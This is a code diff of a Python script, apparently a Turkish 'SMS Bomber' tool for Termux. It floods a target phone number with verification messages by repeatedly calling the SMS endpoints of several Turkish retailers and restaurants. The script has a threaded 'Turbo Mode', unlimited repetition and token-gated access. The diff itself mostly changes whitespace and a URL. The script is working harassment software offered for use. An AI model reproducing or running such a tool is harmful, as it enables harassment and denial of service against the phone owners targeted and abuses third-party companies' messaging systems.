@@ -6,29 +6,28 @@ from time import sleep
 from os import system
 import threading
 import sys
-
 class TokenManager:
     def __init__(self):
-        self.token_url = "https://scorpion292439.github.io/scorpion-sms-bomber/"
+        self.token_url = "https://scorpion292439.github.io/scorpion-Toolkit/"
         self.verify_url = "https://ipchecer-default-rtdb.firebaseio.com/tokens.json"
         self.token = None
-    
+   
     def get_token_from_user(self):
         system("clear")
         print(f"""
 {Fore.RED + Style.BRIGHT}
     ╔══════════════════════════════════════════════════════════════════════════════╗
-    ║                                                                              ║
-    ║                            TOKEN DOĞRULAMA SİSTEMİ                           ║
-    ║                                                                              ║
+    ║ ║
+    ║ TOKEN DOĞRULAMA SİSTEMİ ║
+    ║ ║
     ╚══════════════════════════════════════════════════════════════════════════════╝
 {Style.RESET_ALL}""")
-        
+       
         print(f"{Fore.YELLOW + Style.BRIGHT}🔐 Token Yok! Lütfen aşağıdaki adresten token alın:{Style.RESET_ALL}")
         print(f"{Fore.CYAN + Style.BRIGHT}🌐 Site: {self.token_url}{Style.RESET_ALL}")
         print(f"{Fore.YELLOW + Style.BRIGHT}📝 Token: {Fore.GREEN}", end="")
         token = input().strip()
-        
+       
         if self.verify_token(token):
             self.token = token
             print(f"{Fore.GREEN + Style.BRIGHT}✅ Token doğrulandı! Scorpion SMS Bomber başlatılıyor...{Style.RESET_ALL}")
@@ -39,7 +38,7 @@ class TokenManager:
             print(f"{Fore.YELLOW + Style.BRIGHT}🔑 Yeni token almak için: {self.token_url}{Style.RESET_ALL}")
             sleep(3)
             return False
-    
+   
     def verify_token(self, token):
         try:
             response = requests.get(self.verify_url, timeout=10)
@@ -54,10 +53,9 @@ class TokenManager:
         except Exception as e:
             print(f"{Fore.RED + Style.BRIGHT}⚠️ Token doğrulama hatası: {str(e)}{Style.RESET_ALL}")
             return False
-
 class SendSms():
     adet = 0
-  
+ 
     def __init__(self, phone, mail):
         print(f"{Fore.RED + Style.BRIGHT}🦂 {Style.RESET_ALL}{Fore.YELLOW + Style.BRIGHT}Scorpion Strike Initialized! Target Locked: {Fore.GREEN + Style.BRIGHT}{phone}{Style.RESET_ALL}")
         rakam = []
@@ -75,7 +73,6 @@ class SendSms():
             self.mail = mail
         else:
             self.mail = ''.join(choice(ascii_lowercase) for i in range(22))+"@gmail.com"
-
     #kahvedunyasi.com
     def KahveDunyasi(self):
         try:
@@ -90,7 +87,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.kahvedunyasi.com{Style.RESET_ALL}")
-      
+     
     #bim
     def Bim(self):
         try:
@@ -102,7 +99,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}bim.veesk.net{Style.RESET_ALL}")
-        
+       
     #evidea.com
     def Evidea(self):
         try:
@@ -173,7 +170,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}api.filemarket.com.tr{Style.RESET_ALL}")
-          
+         
     #komagene.com.tr
     def Komagene(self):
         try:
@@ -188,7 +185,7 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}gateway.komagene.com{Style.RESET_ALL}")
-  
+ 
     #porty.tech
     def Porty(self):
         try:
@@ -217,50 +214,47 @@ class SendSms():
                 raise
         except:
             print(f"{Fore.RED + Style.BRIGHT}🦂{Fore.RED} [STRIKE MISS]{Style.RESET_ALL} {Fore.LIGHTRED_EX}Target Evaded!{Style.RESET_ALL} {self.phone} --> {Fore.CYAN}frontend.dominos.com.tr{Style.RESET_ALL}")
-
 def print_banner():
     banner = f"""
 {Fore.RED + Style.BRIGHT}
     ╔══════════════════════════════════════════════════════════════════════════════╗
-    ║                                                                              ║
-    ║  ██████╗██╗██████╗ ██╗    ██╗██╗  ██╗███████╗███╗   ███╗ ██████╗ ██╗██████╗  ║
-    ║  ██╔══██╗██║██╔══██╗██║    ██║██║ ██╔╝██╔════╝████╗ ████║██╔═══██╗██║██╔══██╗ ║
-    ║  ██████╔╝██║██████╔╝██║ █╗ ██║█████╔╝ █████╗  ██╔████╔██║██║   ██║██║██████╔╝ ║
-    ║  ██╔══██╗██║██╔══██╗██║███╗██║██╔═██╗ ██╔══╝  ██║╚██╔╝██║██║   ██║██║██╔══██╗ ║
-    ║  ██║  ██║██║██║  ██║╚███╔███╔╝██║  ██╗███████╗██║ ╚═╝ ██║╚██████╔╝██║██████╔╝ ║
-    ║  ╚═╝  ╚═╝╚═╝╚═╝  ╚═╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝ ╚═════╝ ╚═╝╚═════╝  ║
-    ║                                                                              ║
+    ║ ║
+    ║ ██████╗██╗██████╗ ██╗ ██╗██╗ ██╗███████╗███╗ ███╗ ██████╗ ██╗██████╗ ║
+    ║ ██╔══██╗██║██╔══██╗██║ ██║██║ ██╔╝██╔════╝████╗ ████║██╔═══██╗██║██╔══██╗ ║
+    ║ ██████╔╝██║██████╔╝██║ █╗ ██║█████╔╝ █████╗ ██╔████╔██║██║ ██║██║██████╔╝ ║
+    ║ ██╔══██╗██║██╔══██╗██║███╗██║██╔═██╗ ██╔══╝ ██║╚██╔╝██║██║ ██║██║██╔══██╗ ║
+    ║ ██║ ██║██║██║ ██║╚███╔███╔╝██║ ██╗███████╗██║ ╚═╝ ██║╚██████╔╝██║██████╔╝ ║
+    ║ ╚═╝ ╚═╝╚═╝╚═╝ ╚═╝ ╚══╝╚══╝ ╚═╝ ╚═╝╚══════╝╚═╝ ╚═╝ ╚═════╝ ╚═╝╚═════╝ ║
+    ║ ║
     ╚══════════════════════════════════════════════════════════════════════════════╝
-{Fore.YELLOW + Style.BRIGHT}    SMS Bomber v2.0 | Powered by {Fore.RED + Style.BRIGHT}Scorpion{Fore.YELLOW + Style.BRIGHT} | Termux Edition
-{Fore.GREEN + Style.BRIGHT}    Token Doğrulama Sistemi Aktif
+{Fore.YELLOW + Style.BRIGHT} SMS Bomber v2.0 | Powered by {Fore.RED + Style.BRIGHT}Scorpion{Fore.YELLOW + Style.BRIGHT} | Termux Edition
+{Fore.GREEN + Style.BRIGHT} Token Doğrulama Sistemi Aktif
 {Style.RESET_ALL}
 """
     print(banner)
-
 def main():
     # Token kontrolü
     token_manager = TokenManager()
-    
+   
     while True:
         if token_manager.token is None:
             if not token_manager.get_token_from_user():
                 continue
-        
+       
         system("clear")
         print_banner()
-        
+       
         servisler_sms = []
         for attribute in dir(SendSms):
             attribute_value = getattr(SendSms, attribute)
             if callable(attribute_value):
                 if attribute.startswith('__') == False:
                     servisler_sms.append(attribute)
-
         try:
             menu = input(f"{Fore.MAGENTA + Style.BRIGHT + Back.BLACK}╔═[ {Fore.WHITE}SCORPION MENU{Fore.MAGENTA} ]═╗{Style.RESET_ALL}\n"
-                         f"{Fore.CYAN + Style.BRIGHT}║{Fore.WHITE} 1. {Fore.GREEN}SMS Gönder (Normal Mode){Fore.WHITE}           ║{Style.RESET_ALL}\n"
-                         f"{Fore.CYAN}║{Fore.WHITE} 2. {Fore.GREEN}SMS Gönder (Turbo Mode){Fore.WHITE}           ║{Style.RESET_ALL}\n"
-                         f"{Fore.CYAN}║{Fore.WHITE} 3. {Fore.RED}Çıkış / Exit{Fore.WHITE}                     ║{Style.RESET_ALL}\n"
+                         f"{Fore.CYAN + Style.BRIGHT}║{Fore.WHITE} 1. {Fore.GREEN}SMS Gönder (Normal Mode){Fore.WHITE} ║{Style.RESET_ALL}\n"
+                         f"{Fore.CYAN}║{Fore.WHITE} 2. {Fore.GREEN}SMS Gönder (Turbo Mode){Fore.WHITE} ║{Style.RESET_ALL}\n"
+                         f"{Fore.CYAN}║{Fore.WHITE} 3. {Fore.RED}Çıkış / Exit{Fore.WHITE} ║{Style.RESET_ALL}\n"
                          f"{Fore.MAGENTA + Style.BRIGHT}╚{'═' * 48}╝{Style.RESET_ALL}\n\n"
                          f"{Fore.YELLOW + Style.BRIGHT}Seçimini Yap / Choose: {Fore.GREEN}")
             if menu == "":
@@ -270,7 +264,6 @@ def main():
             print(f"{Fore.RED + Style.BRIGHT}❌ Hatalı Giriş! Lütfen Sayı Giriniz. / Invalid Input! Please Enter a Number.{Style.RESET_ALL}")
             sleep(3)
             continue
-
         if menu == 1:
             print_banner()
             print(f"{Fore.YELLOW + Style.BRIGHT}📱 Telefon Numarası (+90 Olmadan, Birden Fazla İçin Enter Bas): {Fore.GREEN}", end="")
@@ -301,14 +294,14 @@ def main():
                     print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz Numara! / Invalid Number!{Style.RESET_ALL}")
                     sleep(3)
                     continue
-            
+           
             print(f"{Fore.YELLOW + Style.BRIGHT}📧 E-posta Adresi (Bilmiyorsan Enter): {Fore.GREEN}", end="")
             mail = input()
             if mail and ("@" not in mail or ".com" not in mail):
                 print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz E-posta! / Invalid Email!{Style.RESET_ALL}")
                 sleep(3)
                 continue
-            
+           
             print(f"{Fore.YELLOW + Style.BRIGHT}📤 Kaç SMS? {sonsuz}: {Fore.GREEN}", end="")
             kere_input = input()
             if kere_input:
@@ -320,7 +313,7 @@ def main():
                     continue
             else:
                 kere = None
-            
+           
             print(f"{Fore.YELLOW + Style.BRIGHT}⏱️ Saniye Aralığı: {Fore.GREEN}", end="")
             try:
                 aralik = int(input())
@@ -328,9 +321,9 @@ def main():
                 print(f"{Fore.RED + Style.BRIGHT}❌ Hatalı Sayı! / Invalid Number!{Style.RESET_ALL}")
                 sleep(3)
                 continue
-            
+           
             print(f"{Fore.CYAN + Style.BRIGHT}🚀 Gönderim Başlatılıyor... / Sending Started...{Style.RESET_ALL}")
-            
+           
             if kere is None and len(tel_liste) == 1:
                 sms = SendSms(tel_liste[0], mail)
                 while True:
@@ -347,15 +340,15 @@ def main():
                                     break
                                 exec(f"sms.{attribute}()")
                                 sleep(aralik)
-            
+           
             print(f"{Fore.GREEN + Style.BRIGHT}✅ Tamamlandı! Menüye Dönmek İçin Enter... / Completed! Enter to Menu...{Style.RESET_ALL}")
             input()
-        
+       
         elif menu == 3:
             print(f"{Fore.RED + Style.BRIGHT}👋 Çıkış Yapılıyor... / Exiting...{Style.RESET_ALL}")
             sleep(2)
             break
-        
+       
         elif menu == 2:
             print_banner()
             print(f"{Fore.YELLOW + Style.BRIGHT}📱 Telefon Numarası (+90 Olmadan): {Fore.GREEN}", end="")
@@ -368,18 +361,18 @@ def main():
                 print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz Numara! / Invalid Number!{Style.RESET_ALL}")
                 sleep(3)
                 continue
-            
+           
             print(f"{Fore.YELLOW + Style.BRIGHT}📧 E-posta Adresi (Bilmiyorsan Enter): {Fore.GREEN}", end="")
             mail = input()
             if mail and ("@" not in mail or ".com" not in mail):
                 print(f"{Fore.RED + Style.BRIGHT}❌ Geçersiz E-posta! / Invalid Email!{Style.RESET_ALL}")
                 sleep(3)
                 continue
-            
+           
             print(f"{Fore.CYAN + Style.BRIGHT}⚡ Turbo Modu Başlatılıyor... / Turbo Mode Started...{Style.RESET_ALL}")
             send_sms = SendSms(tel_no, mail)
             dur = threading.Event()
-            
+           
             def Turbo():
                 while not dur.is_set():
                     threads = []
@@ -389,13 +382,12 @@ def main():
                         t.start()
                     for t in threads:
                         t.join()
-            
+           
             try:
                 Turbo()
             except KeyboardInterrupt:
                 dur.set()
                 print(f"{Fore.YELLOW + Style.BRIGHT}⏹️ Durduruldu! Menüye Dönülüyor... / Stopped! Returning to Menu...{Style.RESET_ALL}")
                 sleep(2)
-
 if __name__ == "__main__":
     main()
